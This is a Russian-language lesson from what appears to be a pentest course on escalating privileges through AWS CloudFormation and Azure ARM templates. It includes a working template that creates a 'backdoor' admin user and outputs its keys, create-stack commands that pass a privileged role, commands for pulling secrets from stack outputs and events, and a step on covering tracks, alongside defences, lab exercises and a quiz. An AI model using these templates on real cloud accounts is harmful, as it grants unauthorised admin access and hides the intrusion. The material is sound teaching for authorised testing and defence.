---
id: cloud-cloudformation
title: "CloudFormation и ARM: злоупотребление шаблонами инфраструктуры"
category: cloud
parent: cloud-supply-chain
difficulty: expert
order: 4
tags: [cloud, cloudformation, arm, iac, templates, passrole, supply-chain]
prerequisites: [cloud-supply-chain, cloud-terraform]
useful_for:
  - "Атаки на IaC-шаблоны AWS/Azure"
  - "Эксплуатация PassRole через CloudFormation"
  - "Понимание IaC как вектора эскалации"
estimated_minutes: 50
summary: "Как атаковать CloudFormation и ARM-шаблоны: чтение стеков, злоупотребление ролями сервиса, экспорт секретов и эскалация через PassRole. Практические цепочки."
---

Infrastructure as Code (IaC) описывает облако декларативно. CloudFormation (AWS) и ARM/Bicep (Azure) исполняют шаблоны от имени **service role** — и это делает их вектором эскалации: кто может создать стек, тот может заставить сервис действовать с чужими правами. Урок про практические цепочки.

## Как работает CloudFormation

Стек — это набор ресурсов, созданных по шаблону. Ключевой элемент — **service role** (`RoleARN`), от имени которой CloudFormation создаёт ресурсы. Если у роли широкие права, а у атакующего — `cloudformation:CreateStack` + `iam:PassRole`, он может эскалировать.

```bash
# Список стеков и их ролей
aws cloudformation list-stacks --query 'StackSummaries[].StackName'
aws cloudformation describe-stacks --stack-name <name> \
  --query 'Stacks[].RoleARN'
# Список ресурсов стека (может включать секреты в outputs)
aws cloudformation describe-stack-resources --stack-name <name>
aws cloudformation describe-stacks --stack-name <name> \
  --query 'Stacks[].Outputs'
```

## Разведка: что можно

```bash
# Права на CloudFormation
aws iam list-attached-user-policies --user-name <user>
# Ищем: cloudformation:*, iam:PassRole, iam:CreateRole, iam:AttachRolePolicy
```

Если есть `cloudformation:CreateStack` и `iam:PassRole` на привилегированную роль — эскалация тривиальна.

## Эскалация через PassRole + CloudFormation

Идея: создаём стек, который создаёт пользователя/ключ или прикрепляет политику от имени роли, переданной через PassRole.

```json
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "EvilUser": {
      "Type": "AWS::IAM::User",
      "Properties": {
        "UserName": "backdoor",
        "Policies": [{
          "PolicyName": "admin",
          "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [{"Effect":"Allow","Action":"*","Resource":"*"}]
          }
        }]
      }
    },
    "EvilKey": {
      "Type": "AWS::IAM::AccessKey",
      "Properties": {"UserName": {"Ref": "EvilUser"}}
    }
  },
  "Outputs": {
    "AK": {"Value": {"Ref": "EvilKey"}},
    "SK": {"Value": {"Fn::GetAtt": ["EvilKey","SecretAccessKey"]}}
  }
}
```

```bash
aws cloudformation create-stack --stack-name pwn \
  --template-body file://evil.json \
  --capabilities CAPABILITY_NAMED_IAM \
  --role-arn arn:aws:iam::123:role/AdminRole
# После создания — читаем outputs с новыми ключами
aws cloudformation describe-stacks --stack-name pwn \
  --query 'Stacks[0].Outputs'
```

`--capabilities CAPABILITY_NAMED_IAM` требуется для создания именованных IAM-ресурсов.

## ARM/Bicep (Azure)

Аналог в Azure — ARM-шаблоны, исполняемые от имени deployment principal. Частая ошибка — назначение роли `Owner` на уровне подписки.

```bash
# Развёртывание ARM-шаблона (эскалация через roleAssignment)
az deployment group create -g <RG> \
  --template-file evil.json --parameters adminPrincipalId=<objId>

# Просмотр развёртываний и их outputs
az deployment group list -g <RG>
az deployment group show -g <RG> -n <deployment>
```

ARM может создавать `Microsoft.Authorization/roleAssignments`, выдавая `Owner` любому principal — классический privilege escalation в Azure.

## Секреты в стеках и drift

Секреты часто попадают в **outputs**, **parameters** (если `NoEcho` не выставлен) и в **event logs** стека.

```bash
# История событий стека — иногда светит параметры
aws cloudformation describe-stack-events --stack-name <name> \
  --query 'StackEvents[].ResourceStatusReason'
# Drift — расхождение между шаблоном и реальностью (иногда с секретами)
aws cloudformation detect-stack-drift --stack-name <name>
```

## Разобранный пример: от PassRole к администратору

**Дано:** пользователь `dev` с правами `cloudformation:CreateStack`, `iam:PassRole` на `arn:aws:iam::123:role/DeployRole`, где `DeployRole` имеет `AdministratorAccess`.

1. Проверяем права:

```bash
aws sts get-caller-identity
aws iam simulate-principal-policy --policy-source-arn <dev-arn> \
  --action-names cloudformation:CreateStack iam:PassRole
```

2. Создаём стек из шаблона выше с `--role-arn` целевой роли.
3. Читаем outputs — получаем ключи нового админ-пользователя.
4. Проверяем:

```bash
AWS_ACCESS_KEY_ID=<AK> AWS_SECRET_ACCESS_KEY=<SK> aws sts get-caller-identity
aws iam list-users    # полный контроль
```

5. Заметаем следы: удаляем стек (но ключи остаются) — аккуратно, чтобы не оставить артефактов.

## Частые ошибки

- **Считать IaC «только конфигом».** Шаблон = код, исполняемый с правами роли.
- **Забывать про `CAPABILITY_NAMED_IAM`.** Без него создание IAM-ресурсов не пройдёт.
- **Игнорировать outputs и events.** Там часто светят секреты/параметры.
- **Не проверять PassRole на wildcard.** `iam:PassRole` на `*` = потенциальный админ.
- **Путать role создателя и service role.** Стек действует от имени service role.
- **Не смотреть drift.** Расхождения могут раскрыть ручные правки.

## Что дальше / решение

- Есть `CreateStack` + `PassRole` → стройте стек-эскалацию.
- Есть только чтение → ищите секреты в outputs/parameters/events.
- Azure → проверяйте `roleAssignments` в шаблонах и deployment principal.
- Смежные уроки: `cloud-terraform`, `cloud-privesc-iam`, `cloud-supply-chain`.

## PassRole + CloudFormation пошагово

CloudFormation запускает стек от имени переданной роли. Если есть `iam:PassRole` на роль с широкими правами и `cloudformation:CreateStack`, можно выполнить произвольные действия через шаблон:

```yaml
Resources:
  Admin:
    Type: AWS::IAM::Policy
    Properties:
      PolicyName: esc
      PolicyDocument:
        Statement: [{Effect: Allow, Action: "*", Resource: "*"}]
      Users: [alice]
```

```bash
aws cloudformation create-stack --stack-name esc \
  --template-body file://t.yaml --role-arn arn:aws:iam::111122223333:role/HighPriv
```

## ARM/Bicep (Azure)

Аналог в Azure: развернуть ARM-шаблон с ролью Contributor. Права `Microsoft.Resources/deployments/write` + managed identity дают эскалацию. Bicep компилируется в ARM. Проверяйте `owner`/`userAccessAdministrator` в scope.

## Секреты в стеках

CloudFormation хранит параметры и outputs; «NoEcho» маскирует, но значения остаются в истории. Drift-детект показывает ручные изменения. Проверьте `describe-stacks`, `describe-stack-resources`, `get-template`.

## Практическое задание

В тестовом аккаунте создайте роль `CFNRole` с `iam:*` и пользователя с `iam:PassRole` + `cloudformation:CreateStack`. Разверните стек, создающий админ-политику, и проверьте, что права появились. Затем уберите `iam:PassRole` и повторите — стек должен упасть. Это демонстрирует, что PassRole — критичный мост.

## Drift и outputs

`aws cloudformation detect-stack-drift --stack-name X` показывает ручные изменения. Outputs и параметры (`describe-stacks --query 'Stacks[].Parameters'`) могут содержать чувствительные значения, даже с `NoEcho` (значение скрыто в консоли, но доступно через API при правах). `get-template` возвращает исходный шаблон — полезно для понимания, какие ресурсы и роли созданы.

## Защита

- Ограничить `iam:PassRole` конкретными ролями (`Resource` не `*`).
- Запретить `cloudformation:CreateStack` с произвольными ролями.
- Использовать permission boundaries на роли стеков.
- Мониторить `CreateStack`/`UpdateStack` в CloudTrail.
- Ревью шаблонов (checkov/cfn-nag).

## Практическое задание 2

Создайте стек с `NoEcho`-параметром (пароль) и попробуйте извлечь его через `describe-stacks`/`get-template`. Убедитесь, что при наличии прав значение доступно. Затем добавьте permission boundary на роль стека и проверьте, что даже при PassRole нельзя выйти за границу. Это показывает, почему boundary — обязательная мера.

## Итоговый чек-лист

1. Проверить `iam:PassRole` и `cloudformation:CreateStack`.
2. Собрать список ролей, доступных для PassRole.
3. Развернуть стек, выдающий права, от имени привилегированной роли.
4. Проверить результат (`get-caller-identity`, тестовые вызовы).
5. Для защиты — ограничить PassRole и добавить permission boundaries.

## Почему это критично

CloudFormation запускает ресурсы от имени переданной роли. Если PassRole не ограничен, шаблон может создать любые ресурсы с любыми правами — по сути, это «выполнить произвольный IaC с админ-ролью». Именно поэтому `iam:PassRole` относится к самым опасным правам в AWS и требует строгого `Resource`-ограничения и permission boundaries.

## Nested stacks и drift

CloudFormation поддерживает вложенные стеки и macro — дополнительная поверхность. Macro выполняется как Lambda и может модифицировать шаблон. Проверьте `list-stacks`, `describe-stack-resources` и наличие macro. Drift-детект (`detect-stack-drift`) покажет ручные изменения, которые могли добавить злоумышленник.

## Быстрая проверка

```bash
aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE
aws cloudformation describe-stacks --stack-name app --query 'Stacks[].Parameters'
aws cloudformation get-template --stack-name app
aws iam list-roles | grep -i cloudformation
```

Проверьте роли стеков и `iam:PassRole`. Если PassRole не ограничен, шаблон с широкими правами даёт эскалацию.

## Квиз

```quiz
- question: "От чьего имени CloudFormation создаёт ресурсы стека?"
  options:
    - "От имени service role (RoleARN), переданной в стек"
    - "От имени root"
    - "От имени анонимного пользователя"
    - "От имени CloudTrail"
  answer: 0
  explanation: "Стек исполняется с правами своей service role."
- question: "Какое сочетание прав позволяет эскалацию через CloudFormation?"
  options:
    - "cloudformation:CreateStack + iam:PassRole"
    - "s3:GetObject + ec2:Describe"
    - "logs:PutLogEvents"
    - "cloudwatch:PutMetricData"
  answer: 0
  explanation: "Создать стек с привилегированной ролью = эскалация."
- question: "Какой флаг нужен для создания именованных IAM-ресурсов в стеке?"
  options:
    - "CAPABILITY_NAMED_IAM"
    - "CAPABILITY_IAM"
    - "CAPABILITY_AUTO_EXPAND"
    - "--force"
  answer: 0
  explanation: "Именованные IAM-ресурсы требуют CAPABILITY_NAMED_IAM."
- question: "Где в стеках часто светят секреты?"
  options:
    - "В outputs, parameters и event logs"
    - "В названии стека"
    - "В регионе"
    - "В теге версии"
  answer: 0
  explanation: "Outputs/параметры/события часто раскрывают значения."
- question: "Как в Azure ARM-шаблон может выдать права?"
  options:
    - "Созданием Microsoft.Authorization/roleAssignments"
    - "Изменением DNS"
    - "Удалением подписки"
    - "Сменой пароля root"
  answer: 0
  explanation: "ARM может назначать роли, включая Owner."
```

## Где пригодится

- **Red team:** IaC как путь к эскалации в AWS/Azure.
- **Bug bounty:** мисконфиги шаблонов и PassRole.
- **Пентест:** аудит стеков, outputs и service roles.
- **Работа/DevSecOps:** least-privilege для service role, NoEcho для секретов.
- **Дальше по дереву:** `cloud-terraform`, `cloud-privesc-iam`.
